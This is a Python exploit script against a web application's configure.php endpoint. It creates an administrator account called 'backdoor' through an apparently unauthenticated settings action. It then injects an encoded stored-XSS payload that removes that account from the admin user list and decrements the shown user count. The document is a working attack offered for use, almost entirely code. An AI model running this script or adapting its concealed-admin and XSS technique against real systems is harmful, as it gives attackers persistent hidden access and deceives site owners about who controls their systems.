import requests
import argparse
from base64 import b64encode

js = """
var table = document.getElementById("userlisttable");
var rows = table.getElementsByTagName("tr");

for (var i = 0; i < rows.length; i++) {
    var cells = rows[i].getElementsByTagName("td");
    var found = false;

    for (var j = 0; j < cells.length; j++) {
        var anchors = cells[j].getElementsByTagName("a");

        for (var k = 0; k < anchors.length; k++) {
            if (
                anchors[k].innerText === "{}" ||
                anchors[k].innerText.includes("atob(") ||
                anchors[k].querySelector("script") !== null
            ) {
                rows[i].parentNode.removeChild(rows[i]);
                found = true;
                break;
            }
        }

        if (found) {
            break;
        }
    }
}

var userCountElement = document.querySelector('.lead');
var userCountText = userCountElement.textContent;
var userCount = parseInt(userCountText);

if (!isNaN(userCount)) {
    userCount--;
    userCountElement.textContent = userCount + ' Users';
}
"""

payload = "<script>eval(atob('{}'));</script>"


def backdoor(url, username, password):
    config_url = url + '/inc/configure.php'

    print("[*] Creating admin account...")
    r = requests.post(config_url, data={'s': 'authsave', 'u': username, 'p': password})
    if r.status_code != 200:
        print("[!] An error occured")
        return

    print("[*] Hiding admin account...")
    base64_js = b64encode(js.format(username).encode()).decode()
    xss_payload = payload.format(base64_js)

    r = requests.post(config_url, data={'s': 'authsave', 'u': xss_payload, 'p': password})
    if r.status_code != 200:
        print("[!] An error occured")
        return

    print("[*] Exploit finished!")

parser = argparse.ArgumentParser()
parser.add_argument('--url', help='The base url of the target', required=True)
parser.add_argument('--username', default='backdoor', help='The username of the backdoor account')
parser.add_argument('--password', default='backdoor', help='The password of the backdoor account')
args = parser.parse_args()

backdoor(args.url.rstrip('/'), args.username, args.password)